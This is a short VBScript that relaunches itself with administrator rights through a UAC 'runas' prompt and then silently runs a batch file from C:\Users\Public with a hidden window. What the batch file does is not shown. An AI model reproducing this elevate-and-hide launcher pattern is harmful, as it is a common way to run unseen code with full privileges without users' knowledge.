
If Not WScript.Arguments.Named.Exists("elevate") Then
  CreateObject("Shell.Application").ShellExecute WScript.FullName _
    , """" & WScript.ScriptFullName & """ /elevate", "", "runas", 1
  WScript.Quit
End If


Set WshShell = CreateObject("WScript.Shell") 
WshShell.Run chr(34) & "C:\Users\Public\dependencies.bat" & Chr(34), 0
Set WshShell = Nothing
